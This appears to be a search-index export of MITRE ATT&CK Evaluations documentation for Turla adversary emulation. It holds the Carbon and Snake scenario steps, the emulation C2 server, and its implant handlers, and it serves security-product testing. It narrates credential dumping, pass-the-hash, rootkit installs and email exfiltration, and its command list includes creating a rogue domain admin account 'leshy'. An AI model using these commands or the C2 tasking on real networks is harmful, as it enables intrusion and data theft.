Tool Transfer T1003.004: Credential Dumping: LSA Secrets T1550.002: Alternate Authentication Material: Pass the Hash","Step 7 Lateral Movement to Second Workstation T1105: Tool Transfer T1550.002: Use Alternate Authentication Material: Pass the Hash T1070.004: Indicator Removal on Host: File Deletion","Step 8 Credential Access on Admin Host[T1105https://attack.mitre.org/techniques/T1105/ Ingress Tool Transfer T1056.001: Input Capture: Keylogging T1059.001: Command and Scripting Interpreter: PowerShell T1021.004: Remote Services: SSH T1489: Service Stop T1041: Exfiltration over C2 Channel T1070.004: Indicator Removal on Host: File Deletion","Step 9 Lateral Movement to Linux Server T1105: Ingress Tool Transfer T1021.004: Remote Services: SSH T1053.003: Scheduled Task/Job: Cron T1078.002: Valid Accounts: Domain Accounts T1070.004: Indicator Removal on Host: File Deletion T1027: Obfuscated Files or Information T1222.002: File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification T1036.005: Masquerading: Match Legitimate Name or Location T1543: Create or Modify System Process T1205: Traffic Signaling T1040: Network Sniffing","Steps & Techniques","To begin the lateral movement onto the targeted Linux Apache server, CARBON-DLL downloads PENQUIN to Adalwolfa’s workstation. Using the stolen credentials previously retrieve by the keylogger, the attackers copy PENQUIN to the Apache server. PENQUIN will mimic the legitimate Linux cron utility and modify the service. Finally, plink will be downloaded and copied to execute PENQUIN on the Apache server.","User Gunter (non-admin) receives a spearphishing email from noreply@sktlocal[.]it with a malicious link, http://www.anto-int.com. Believing the link to be a valid NATO-related site, Gunter clicks the link and is tricked into installing what appears to be a legitimate software installer. The malicious installer ( NtFlashVersion.exe) drops EPIC onto Gunter’s Windows workstation.","User Story","Using the enumerated usernames, the adversary conducts password spraying. This process retrieves Frieda’s admin credentials to the local domain controller. To laterally move onto the DC, the attackers will use Frieda’s stolen password to mount the DC’s C:\\ drive, and downloads and moves a second copy of the CARBON-DLL installer to this drive. The implant will be executed via remote scheduled task and then establish communications with the C2 server by leveraging P2P with the first CARBON-DLL implant Gunter’s device out to the redirector. While performing discovery on the DC, the adversary discovers the following network devices: 1. Remote Apache web server 2. Windows workstation for user Adalwolfa (admin on Apache server)","WordPress domain: CTI shows Turla has utilized compromised legitimate WordPress sites and WordPress-focused URLs for C2 purposes (e.g., newsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php)"]},{"l":"Infrastructure Diagram","p":["Carbon Infrastructure Diagram"]}],[{"i":"#","p":["Based on open-source intelligence, the ATT&CK ® Evaluations team created the below scenario leveraging techniques seen from Turla in the wild. We have adapted the scenario based on tools and resources available at the time. Below is a scenario overview, step-by-step breakdown, and an infrastructure diagram."]},{"i":"snake-emulation-scenario","l":"Snake Emulation Scenario \uD83D\uDCD6","p":["This scenario is a continuation of Turla’s multi-phase operation, as part of an ongoing intelligence collection campaign. The attackers establish a typo-squatting website to target entities with a high value of information. Turla targets the victim with a drive-by compromise, through user interaction Adobe Flash installer bundled with EPIC, is installed on the victim’s Windows workstation. EPIC communicates to the C2 server via proxy web server with HTTPS requests, persists via process injection, and performs enumeration on the victim’s workstation. SNAKE is then deployed to maintain foothold, elevate privileges and communicates to the C2 via HTTP/SMTP/DNS.","Next, the attackers move laterally onto a Microsoft IIS server, install SNAKE, and create an admin account. They then proceed to move laterally onto an Exchange workstation, and install SNAKE. Finally, the attackers move laterally onto an Exchange Server and install LIGHTNERON. LIGHTNERON enables email collection, and staging for exfiltrating stolen data via benign email PDF/JPG attachments. In this, the threat actors are able to collect and exfiltrate sensitive communications in an effort to identify new information sources and collect up-to-date information to further their the mission objectives.","Phase 1: Eglė, an IIS Admin visits a legitimate but compromised website. The website contains a JavaScript that fingerprints users with an MD5 hash. Now identified as a target, the next time Eglė visits the website, the JavaScript initiates a drive-by compromise via malicious adobe flash installer. Through Eglė's interaction, the malicious Adobe Flash installer bundled with EPIC, is installed on the victim Windows workstation. EPIC begins to communicate with the C2 server via proxy web server with HTTPS requests.","Phase 2: EPIC persists via process injection, conducting defense evasion, specifically searching for commonly named processes associated with network defense applications and executing guardrails to not persist on previously infected devices. The attackers then use EPIC to perform enumeration on Eglė's workstation. The results are saved in a zip file for exfiltration, then deleted after exfiltration. Next, SNAKE is deployed as second-stage malware on Eglė's workstation to maintain a foothold and elevate privileges while communicating with C2 via HTTP/SMTP/DNS. With Kernel access via SNAKE, the attackers collect user log-in information from Eglė's workstation, enabling the collection and compromise of valid accounts.","Phase 3: An account found on Eglė's workstation is used to laterally move onto the Microsoft IIS server. SNAKE is installed on the IIS server and the attackers create their own admin account, gaining unrestricted access on the network. Next, the attackers laterally move to Žilvinas' Exchange Workstation and install SNAKE. A new user account Leshy is created under the domain admin group. The attackers then laterally move onto the Exchange Server and install LightNeuron. Rule modification from LIGHTNERON enables collection and staging for exfiltration. LIGHTNEURON exfiltrates stolen data via benign email PDF/JPG attachments to attacker-controlled email addresses.","Snake Operations Flow Diagram","Snake Software Flow Diagram"]},{"i":"scenario-steps","l":"Scenario Steps\uD83D\uDC63","p":["Clicky Jscript Evercookie EPIC","Commands","https://artemonsecurity.com/snake_whitepaper.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2014/08/20082358/uroburos.pdf https://artemonsecurity.com/snake_whitepaper.pdf https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf https://www.circl.lu/pub/tr-25 https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra https://blog.tetrane.com/2019/Analysis-Uroburos-Malware-REVEN.html https://blog.talosintelligence.com/2014/04/snake-campaign-few-words-about-uroburos.html https://www.lastline.com/labsblog/dissecting-turla-rootkit-malware-using-dynamic-analysis/ https://www.lastline.com/labsblog/turla-apt-group-gives-their-kernel-exploit-a-makeover/ https://github.com/hfiref0x/TDL https://www.coresecurity.com/core-labs/advisories/virtualbox-privilege-escalation-vulnerability https://unit42.paloaltonetworks.com/acidbox-rare-malware/","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2014/08/20082358/uroburos.pdf https://artemonsecurity.com/snake_whitepaper.pdf https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf https://www.circl.lu/pub/tr-25/ https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra https://blog.tetrane.com/2019/Analysis-Uroburos-Malware-REVEN.html https://blog.talosintelligence.com/2014/04/snake-campaign-few-words-about-uroburos.html https://www.lastline.com/labsblog/dissecting-turla-rootkit-malware-using-dynamic-analysis/ https://www.lastline.com/labsblog/turla-apt-group-gives-their-kernel-exploit-a-makeover/ https://github.com/hfiref0x/TDL https://www.coresecurity.com/core-labs/advisories/virtualbox-privilege-escalation-vulnerability https://unit42.paloaltonetworks.com/acidbox-rare-malware/","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/ https://github.com/samyk/evercookie https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf https://securelist.com/analysis/publications/65545/the-epic-turla-operation/ https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf","LIGHT NEURON","PSExec Mimikatz","Reporting","SNAKE","Snake downloads LightNeuron and associated the Powershell installation script and config files, transfers them to the Exchange server, drebule, and remotely executes the installation script using WMI to install LightNeuron on the Exchange server.","Snake downloads Mimikatz to the file server, berzas ( 10.100.30.204), and extracts all NTLM hashes on the target to a file. That file is then exfiltrated back to the C2 server.","Snake performs lateral movement to the domain admin's workstation and enables additional persistence by creating a new domain admin account. The retrieved NTLM hash discovered in the previous step is used in a pass-the-hash attack to move laterally to Zilvinas's workstation. PsExec is employed via pass-the-hash to execute and install the Snake rootkit on the target workstation. Once the admin workstation has been compromised, Snake is used to enumerate processes running on Zilvinas's workstation uosis, where it is discovered that ZilvinasAdmin has processes running which can be used for token impersonation. By impersonating ZilvinasAdmin, a new domain user Leshy is created and added to the Domain Admins domain group for persistence.","SNAKE Powershell","SNAKE PSExec","Software","Step 11 Initial Compromise & Establish Foothold T1189: Drive-by Compromise T1204.001: User Execution T1071.001: Application Layer Protocol: Web Protocols T1090.002: Proxy: External Proxy T1071.001: Application Layer Protocol: Web Protocols T1082: System Information Discovery","Step 12 Rootkit Installation T1105: Ingress Tool Transfer T1014: Rootkit T1027: Obfuscated Files or Information T1070: Indicator Removal T1140: Deobfuscate/Decode Files or Information T1546: Event Triggered Execution T1543.003: Create or Modify System Process: Windows Service T1553.006: Subvert Trust Controls: Code Signing Policy Modification T1055.001: Process Injection: Dynamic-link Library Injection T1573.001: Encrypted Channel: Symmetric Cryptography T1071.001: Application Layer Protocol: Web Protocols T1070.004: Indicator Removal: File Deletion","Step 13 First Workstation Discovery T1106: Native API T1057: Process Discovery T1559: Inter-Process Communication T1087.002: Account Discovery: Domain Account T1049: System Network Connections Discovery T1134.002: Access Token Manipulation: Create Process with Token T1134.001: Access Token Manipulation: Token Impersonation/Theft","Step 14 Lateral Movement to File Server T1078.002: Valid Accounts: Domain Account T1559: Inter-Process Communication T1105: Ingress Tool Transfer T1569.002: System Services: Service Execution T1071.001: Application Layer Protocol: Web Protocols T1070.004: Indicator Removal: File Deletion","Step 15 Domain Discovery T1018: Remote System Discovery T1059.001: Command and Scripting Interpreter: PowerShell T1069.001: Permission Group Discovery: Domain Groups T1087.002: Account Discovery: Domain Account","Step 16 Preparation for Lateral Movement to Admin Workstation T1105: Ingress Tool Transfer T1559: Inter-Process Communication T1003.001: OS Credential Dumping: LSASS Memory","Step 17 Lateral Movement to Admin Workstation & Persistence T1057: Process Discovery T1136.002: Create Account: Domain Account T1550.002: Use Alternate Authentication Material: Pass the Hash T1071.001: Application Layer Protocol: Web Protocols T1070.004: Indicator Removal: File Deletion","Step 18 Lateral Movement to Exchange Server T1559: Inter-Process Communication T1105: Ingress Tool Transfer T1070.004: Indicator Removal: File Deletion T1047: Windows Management Instrumentation T1059.001: Command and Scripting Interpreter: PowerShell T1505.002: Server Software Component: Transport Agent T1036.005: Masquerading: Match Legitimate Name or Location","Step 19 Discovery & Email Collection T1119: Automated Collection T1114.002: Email Collection: Remote Email Collection T1001.002: Data Obfuscation: Steganography T1071.003: Application Layer Protocol: Mail Protocols T1016: System Network Configuration Discovery T1564.008: Email Hiding Rules T1573.001: Encrypted Channel: Symmetric Cryptography T1041: Exfiltration Over C2 Channel T1059.003: Command and Scripting Interpreter: Windows Command Shell","Steps & Techniques","The Snake rootkit receives tasking from the C2 server to enumerate currently running processes on the local computer and finds that EgleAdmin has processes running. Further enumeration of the EgleAdmin user shows that it is a member of the File Server Admins group. Snake then enumerates mapped drives on the local machine and finds that Egle's home drive is mapped to the file server, berzas ( 10.100.30.204).","The Snake rootkit receives tasking from the C2 server to use Powershell's ActiveDirectory module to enumerate domain users, admin groups, and computers. Upon discovering Zilvinas's regular and domain admin accounts, Snake will enumerate further details on the accounts. Snake then discovers a workstation, uosis ( 10.100.40.102), belonging to Zilvinas to use as a future lateral movement target.","Turla sends several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic. Emails with JPG attachments containing AES encrypted commands embedded using stegonagraphy are sent from the C2 server to the domain. LightNeuron's transport agent processes all emails via LightNeuron's companion DLL, which executes the embedded command and blocks delivery of the email from the C2 server. LightNeuron automatically collects all emails with recipients matching nk.local in a log file( C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml).Eventually, LightNeuron is tasked to exfiltrate the email log, which is exfiltrated over the existing C2 channel.","User Egle on WIN10 workstation ( 10.100.40.103) Azuolas visits a legitimate, but compromised website nato-int.com. This website was tampered to redirect visitors to a typo-squated malicious website that contains javascript (JS). The malicious website anto-int.com. fingerprints Egle. This malicious WordPress website prompts Egle with a notice to update their NotFlash. Egle clicks to download the update, NTFVersion_e5.exe, containing EPIC (a.k.a. Tavdig/Wipbot). Epic will inject its guard DLL into explorer.exe. it will then search for processes that are typically internet enabled (e.g. iexplore.exe, msedge.exe, or firefox.exe) and inject an embedded worker DLL. Once C2 communications have been established between EPIC and the C2 via the proxy server, discovery is performed on the first host where information about the host device and domain computers is collected.","User Story","Using access from EPIC by Egle on WIN10 workstation Azuolas, SNAKE is pulled down to Azuolas as second-stage malware. The Snake installer will escalate privileges to SYSTEM by exploiting a Windows 10 vulnerability. Once running as SYSTEM, the installer will disable DSE by loading and exploiting a vulnerable driver. Once DSE is disabled, the installer will load the Snake rootkit driver. The rootkit driver will hook various functions and will inject a user-mode DLL into a SYSTEM process to execute received tasks from the C2 server. The driver will then wait for a browser process to make a network request to inject the user-mode DLL into the browser for C2 communications over HTTP. The injected DLLs will communicate between each other via named pipes. At some point, Egle will browse to a website, triggering the rootkit driver to inject the user-mode DLL into the browser process - this DLL will begin communication with the C2 server over HTTP.","Using this information, Snake impersonates the EgleAdmin account to run PsExec and execute another copy of the Snake rootkit installer on the file server, berzas. This new copy of the Snake installer will have the installed rootkit beacon back to the C2 server via a different redirector.","whoami tasklist.exe net user leshy Password12345 /add /domain net group \\Domain Admins\\ leshy /add /domain","whoami tasklist.exe net.exe user /domain EgleAdmin","WMI SNAKE LIGHT NEURON Powershell"]},{"l":"Infrastructure Diagram","p":["Snake Infrastructure Diagram"]}],[{"i":"attck-evaluations-control-server","l":"ATT&CK Evaluations Control Server","p":["This ATT&CK Evaluations Control Server is used to execute behaviors under test during ATT&CK Evaluations.","The Control Server provides features for generating implant stagers, controlling agents, and executing modules.","The Control Server is backed with a REST API to support automation and integration with other tools."]},{"l":"Handlers Contained","p":["The below handlers were developed specifically for this adversary's emulation plans. Each handler contains a readme describing configurations, cited research, and available commands.","Handler","Description","Carbon","This C2 handler is used for the Carbon implant in the Carbon Scenario used in ATT&CK Evaluations Enterprise Round 5","Epic","This C2 handler is used for the Epic implant in the Carbon & Snake Scenario used in ATT&CK Evaluations Enterprise Round 5","LightNeuron","This C2 handler is used for the LightNeuron implant in the Snake Scenario used in ATT&CK Evaluations Enterprise Round 5","Snake","This C2 handler is used for the Snake implant in the Snake Scenario used in ATT&CK Evaluations Enterprise Round 5"]},{"l":"Usage","p":["This repository is meant to act as a submodule within other adversary emulation or ATT&CK evaluation repositories. To use this control server repository, you may either run the binary as is or reference the entire repository as a submodule.","The control server expects the following folder structure for payloads/uploads:","File uploads will be stored in the files subdirectory of the current working directory of the C2 server. The repository already has this directory available, but you will need to create the folder before running the binary from a different location.","Payload downloads will be fetched from the payloads folder of the parent directory of the C2 server's working location. The repository does not contain this payload directory, since the end user will be responsible for providing the payloads according to their specific use case. Ensure that this folder exists in the parent directory when running the C2 server. For example, if the control server is being run from the Resources/control_server directory, the payloads must be placed in Resources/payloads/ in order for the handlers to successfully serve them. The SideTwist handler in particular expects its payloads to be in a separate SideTwist directory under the payloads directory (e.g. Resources/payloads/SideTwist)","The control server is configured using two configuration files - one for handler configuration and one for REST API configuration. By default, the control server will pull the handler configuration file from ./config/handler_config.yml and the REST API config from ./config/restAPI_config.yml.","You can tell the control server to pull from different config file paths using the -c or --config option to specify the handler config path and -r or --rest-config to specify the REST API config path as follows:"]},{"l":"Build from source","p":["To run with default config paths:","To specify config paths:"]},{"l":"Test Instructions","p":["Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by editing the default config/handler_config.yml file or by creating your own config YML file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","Using default config file paths:","To specify config paths:","Alternatively run direct from source:","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Installation Dependencies","p":["Install Go version 1.15 or higher.","Run tests from the main repository directory. Go should automatically fetch needed dependencies.","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:","Look at the go.mod file if you want to see the dependencies in detail."]},{"i":"attck-evaluations-c2-client","l":"ATT&CK Evaluations C2 Client","p":["This client is provided to interact with the C2 server via its REST API."]},{"l":"Build Instructions","p":["Install dependencies using pip3:"]},{"i":"test-instructions-1","l":"Test Instructions"},{"i":"usage-examples-1","l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by editing the default config/handler_config.yml file or by creating your own config YML. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","To specify config paths:","Establish an implant session","Run an implant program of your choice to connect to the C2 (make sure that the corresponding handler was enabled).","Run the client python script to manage implant sessions.","For specific instructions on tasking a particular implant, reference the appropriate README."]}],[{"l":"Carbon HTTP handler","p":["The Carbon HTTP C2 handler is the server-side counterpart for the Carbon implant and is specifically designed to interact with it over HTTP. The handler is configured to do the following:","respond to basic heartbeat requests at / to indicate server availability.","register a new implant at /javascript/* where * indicates any page when a PHPSESSID cookie is included. 1","indicate that a session exists for an existing implant at /javascript/* where * indicates any page when a PHPSESSID cookie is included.","return command instructions at /javascript/view.php when a PHPSESSID cookie is included. 1","process posted data at /javascript/ for requests with a valid PHPSESSID cookie.","accept tasking from ./evalsC2client.py and send to implants when requested."]},{"l":"Components","p":["4 byte int","bytes","Data Type","Description","Field","GET /, where the server is expecting heartbeat requests and will respond with 200 OK if it is up.","GET /javascript/*, where * indicates any page, where the server is listening for requests with a PHPSESSID cookie. The server will register new implant sessions using that PHPSESSID cookie value as the UUID or state that the session already exists. 1","GET /javascript/view.php, where the server is listening for requests with a PHPSESSID cookie. The server will return an HTML document with a task embedded, currently encoded in base64. 1","id","len_object_id","number of files to send","object_id","POST /javascript/ or POST /javascript/*, where the server is listening for requests with a PHPSESSID cookie and data. The server will attempt to process data sent with the POST request. The correct format for this data is as follows:","the data of the file being uploaded","The handler consists of an HTTP web server that listens on a specified address/port and serves the following URL endpoints:","the implant's ID","the length of the file being uploaded","the length of the implant's ID","the task ID","tmp_content","tmp_filesize","val"]},{"l":"Encryption","p":["When tasking the implant, the Carbon C2 handler will encrypt the task information before embedding the base64 blob in the response HTML. The tasking information is first encrypted using CAST128 and a randomly generated symmetric key. This key is then base64-encoded and encrypted using an RSA public key. The CAST128 ciphertext (with the IV prepended) is appended to the RSA ciphertext, and the result is base64-encoded and placed in the response HTML. 1, 2, 3","The following RSA public key is used (DER base64-encoded):","The 2048-bit RSA public/private key pair used for this implant was generated using Crypto++'s GenerateRandomWithKeySize method and then converted to DER format. To convert from DER to PEM format, you can use the following openssl commands:","When handling task output from the implant, the C2 handler will decrypt responses using the following hardcoded CAST-128 key:","Carbon DLL has used a similar encryption setup for C2 communication in the past 1, with additional components such as an intermediary signature block."]},{"l":"Usage"},{"l":"Building","p":["You can build the control server binary with the following command:"]},{"l":"Configuration","p":["To enable and configure the Carbon HTTP handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the Carbon HTTP entry as needed.","Example:","Run the controlServer binary as sudo and look for success messages in starting up the Carbon handler."]},{"l":"Testing","p":["Unit tests are available for this handler in the carbon_http_test.go file. If you would like to run these tests, use the command sudo go test ./... in the evalsC2server directory, and the unit tests for the Carbon handler will be performed.","If you wish to test this handler manually, these are some sample curl commands that might be useful:","check that the server heartbeat functionality works:","check that the server creates a session for a new implant, responds to an existing session, and returns basic tasking output","check that the server is responding with the correct HTTP status in the case of an error","check that the server is able to process POST data correctly (out of date)"]},{"l":"Tasking","p":["cmd","code","Data Type","Description","Examples ( GUID represents the ID of the implant to task:","Field","id","int","optional, name of the server-side payload to deliver as part of the task. The file must reside in the Resources/payloads/carbon directory in the parent repository","optional, P2P routing blob","optional, path to save the payload on the victim machine. Must be provided if passing in payload","optional, task type code. Defaults to 0 if not provided. Can be from 1-99","payload","payload_dest","required, task ID","required, the command to execute","routing","string","The C2 handler will take care of building the appropriate config file using the provided payload and app information.","To submit a task for the to the C2 server, pass the task information to the REST API server in a JSON dictionary string containing the following fields 1:"]},{"l":"CTI References","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html"]}],[{"l":"Creating Your Own Handler","p":["The Evals C2 server is designed with customization in mind. Developers can easily add new handlers to the C2 server, and users can easily toggle which handlers to enable/disable and configure their settings. This guide describes how developers can add a new handler to the C2 server.","In this guide, we'll use an HTTP C2 handler as a basic example, and we'll call it examplehttphandler."]},{"l":"Add Your Handler Source Code","p":["Within the handlers folder, create a new folder for your C2 handler. In our case, we'll call it examplehttphandler. This folder will contain a Golang package for your C2 handler - all your handler source code and associated test files will go here.","We'll pretend that we created the following files for our demo C2 handler:","handlers/examplehttphandler/examplehttphandler.go","handlers/examplehttphandler/examplehttphandler_test.go"]},{"l":"Handler Init Function","p":["In one of your handler source code files, you will need to mark your C2 handler as an available handler in an init function. This way, when your handler package gets imported, the C2 server will know that your handler is available and where to reach it. You will also need to use a struct to represent your handler, as your handler will need to implement the util.Handler interface. The below code provides an example:","Note that we use a factory method to return our struct - this gives us more flexibility if we need to add more variables to our handler struct, and it allows easier handler creation in unit tests.","util.AvailableHandlers maps handler names ( string) to handler structs that implement the util.Handler interface. This means that our new handler must implement the util.Handler interface:","Since each handler may operate differently, we leave it up to the handler creaters to determine how to start and stop their handlers. The only requirements are the method signatures - both methods must return error if something goes wrong, and StartHandler must take in a string(the REST API server address) and a config.HandlerConfigEntry, which represents the handler config entry for our specific handler. You will not need to call these methods outside of your unit tests - main.go will handle that for you when starting up enabled C2 handlers.","For our HTTP handler, we can use StartHandler to listen on the address specified in our configuration entry (which we will create momentarily) and to serve URL paths of our choice. Feel free to reference other handler implementations to get an idea of how you can set up your C2 handler. StopHandler will take care of gracefully tearing down the handler components."]},{"l":"Register Our C2 Handler","p":["There are two steps for registering our C2 handler - creating a configuration entry and making sure our handler package gets imported."]},{"l":"Import Handler","p":["In order for the C2 server executable to incorporate our new handler code, we need to import the package so that the init function in our handler source code runs. We can do this by adding a new import statement in handler/handlers.go(change your package name accordingly):","The _ underscore in front of the import means that we're only importing the package for its side effects, in particular the init function. Remember that the init function is what stores our handler struct in the map of available handlers. handlers.go will not directly reference individual C2 handlers, so we can't use a typical import."]},{"l":"Config Entry","p":["config/handler_config.yml contains the configuration entries for all of the available handlers in the C2 server. Each entry is a dictionary that maps the handler name to an inner dictionary that maps a configuration setting name to its value.","For example:","In the above example, the handler name is sidetwist, and there are three configuration settings:","host- the IP address that the handler should bind to when listening for C2 traffic","port- the port that the handler should listen on","enabled: whether or not the handler should run when the C2 server starts up.","Since different handlers can use different protocols and methods for handling C2 traffic, you may see that some handlers have different settings in their config entries. The only one that is required is the enabled setting, since this tells the C2 server whether or not to run the handler.","When creating your own handler, think about what configuration settings it will need. If the C2 traffic will be over HTTP, perhaps you want to allow users to specify the host/port combination to listen on.","In this guide, we'll use an HTTP C2 handler as a basic example, and we'll call it examplehttphandler. Our config file entry will look as follows:","Note that we set enabled to true so that our handler will start up when the server is run. We'll simply add the above entry at the end of config/handler_config.yml."]},{"l":"Unit Tests","p":["Don't forget your unit tests! You will need to create unit tests for your new handler and update existing unit tests in handler/handlers_test.go to account for your newly available C2 handler:","The TestStartStopHandlers and TestStartStopHandlersSomeEnabled test functions will need to be updated so that the number of available C2 handlers reflects your newly added handler.","The auxiliary functions mockHandlerConfigFileReaderAllEnabled and mockHandlerConfigFileReaderSomeEnabled will also need to be updated to include dummy entries for your new handler.","When ready, run go test ./... in the main control server repo directory to confirm that all your tests are working."]},{"l":"Recompile binary","p":["Recompile the control server binary to include your new C2 handler and perform any additional testing.","Run go build -o controlServer main.go in the main directory to recompile, and run sudo ./controlServer to run the control server."]}],[{"i":"epic-https-handler","l":"Epic HTTP(S) Handler","p":["The Epic HTTP(S) C2 handler is the server-side counterpart for the Epic implant and is specifically designed to interact with it over HTTP or HTTPS."]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Epic HTTP(S) handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the epic entry as needed.","HTTP example:","HTTPS example:","Run the controlServer binary as sudo and look for success messages in starting up the Epic handler."]},{"l":"Tasking","p":["To submit a task for the C2 server, use the following command format:","The key | value pair is converted into key = value format and placed into the configuration file portion of the server's response.","The optional args are used for specific commands, as detailed below.","The keys tell the implant what to do:","exe- tells the implant to execute the command contained in the value","result- tells the implant to upload the file that is located at the value","name- tells the implant receive a file that the handler is sending to it, with the value being the path that the file contents should be written to on the implant and an option arg telling the handler the file that it should send","del_task- tells the implant to delete the file that is located at the value","Note: The template for the EPIC C2 handler HTML response has been taken from here: https://securelist.com/the-epic-turla-operation/65545/"]},{"l":"Components","p":["The handler consists of an HTTP(S) web server that listens on a specified address/port and serves the following URL endpoints:","POST /, where the server expects a message from the implant that sends data to the server and allows the server to respond with tasking.","The implant sends the server a POST request with an encoded, encrypted, and compressed JSON in the body in the following format:","❗ NOTE: the first POST request from the implant is not encrypted, but is encoded and compressed.","The UUID field is empty if this is the first time the implant makes contact with the server; otherwise, it contains the UUID assigned to it by the server. To allow for reproducibility, the server has two hard coded UUIDs that it gives out to implants. The first UUID that is given out is 218780a0-870e-480e-b2c5dc, and the second is 51515228-8a7b-4226-e6e3f4. If a third implant is registered, the first implant will automatically be deregistered, and its UUID will be given to the third implant. When a fourth implant is registered, the second implant is deregistered, and its UUID is given to the fourth implant, and so on.","The type field contains the command type of the command that was executed to generate the data in the data field.","command- the data field contains the results of a command that was run.","upload- the data field contains the contents of the file to be uploaded.","download- the data field contains either a success or error message that indicates whether the implant was able to download the file.","delete- the data field contains either a success or error message that indicates whether the implant was able to delete the file.","The data field contains base64 encoded results from the command ran for the previous communication cycle.","The server will respond in the following binary format:","The command ID starts at 0 and increments for each command sent to the implant.","The payload is any executable that the implant should execute. It is sent as a base64-encoded string.","The configuration file is an ini file that contains any configuration information, including sending the implant's UUID and commands to execute."]},{"l":"Encryption","p":["EPIC tasking is AES-256 encrypted with a new session key and IV for every communication sent. The IV is prepended to the AES encrypted data. The AES session key is base64 encoded and RSA encrypted then prepended to the IV and AES encrypted data.","Altogether, the data transformations in pseudocode would look similar to the following:","The C2 server and the implant each have an RSA key pair. The keys were generated using the following commands:"]}],[{"l":"Light Neuron Handler","p":["The Light Neuron C2 handler is the server-side counterpart for the Light Neuron implant and is specifically designed to interact with it over email."]},{"l":"Components"},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Light Neuron handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the Light Neuron entry as needed.","host: The SMTP server used to send emails.","port: The SMTP server Port","mailFrom: The email address that will appear as the sender.","username: SMTP username","password: SMTP password","image_file_path: The path to the unmodified image used as the stego attachment.","watch_dir_path: The path on the C2 server that is polled for incoming mail attachments","recipientFilePath: The text file that holds a list of implant emails/sessions","encryption: [true/false] used to tell the handler to encrypt traffic or use plain text traffic.","Example:","Run the controlServer binary as sudo and look for success messages in starting up the LightNeuron handler:"]},{"l":"Registering Implants","p":["Since the LightNeuron implant doesn't beacon by design, implant session registration is approached different from other handlers. To register an implant session with the Lightneuron handler the handler configuration must have a recipientFilePath set. The recipient/target email addresses saved in the file will be registered with the C2 server when the server starts.","The file is a .txt documents that has a single target email per line.","Valid formatting for a recipientFilePath .txt:"]},{"l":"Tasking Implants","p":["To task an implant you need the GUID (in this case, the target email address), the command ID, and the command to execute.","The Implant will accept the following command ID's:","Command ID 2: This command will task the implant to delete a given file.","Command ID 3: This command ID is used to exfiltrate the email log file. It can be passed with a 0 or 1 flag.","0 will exfiltrate the file without deleting.","1 will exfiltrate the file then delete it.","Command ID 5: This command ID is used to execute a command on the target system.","File Deletion Example:","Email Exfiltration Example:","Command execution example:"]},{"l":"LightNeuron Stegonagraphy","p":["The light neuron implant uses a .jpg file to hide command and resulting output data inside. The data is stored at a particulate byte offset inside a \"container\". The container is a specified length of bytes prepended with the length so that the correct information can be read.","Container Layout:","The recieving end will read the container size and create variable to hold the container data. Fianlly, the recieving end will read the number of bytes contained in the container size resulting in clean output/command data.","This stegonagraphy process is bidirectional.","On the C2 side, to reduce bloat logged by the C2 server, if the output is above 1000 bytes then the entire output is written to a file. This allows for simple commands/output (eg. whoami, ipconfig) to output to the C2 log, but file exfiltration and large command output will go into specific files."]},{"l":"Testing"},{"l":"References","p":["This handler uses an external email library to create and send emails over smtp using Postfix https://github.com/xhit/go-simple-mail/v2"]}],[{"l":"Snake HTTP handler","p":["The Snake HTTP C2 handler is the server-side counterpart for the Snake implant and is specifically designed to interact with it over HTTP."]},{"l":"Components","p":["The handler consists of an HTTP web server that listens on a specified address/port and serves the following URL endpoints:","GET /PUB/{identifier}, where {identifier} is either a specific resource that the implant is requesting or the identifier for the implant. Requesting a resource of home.html indicates that the implant is performing a heartbeat check to see if the server is up, in which case the server will respond with 1. 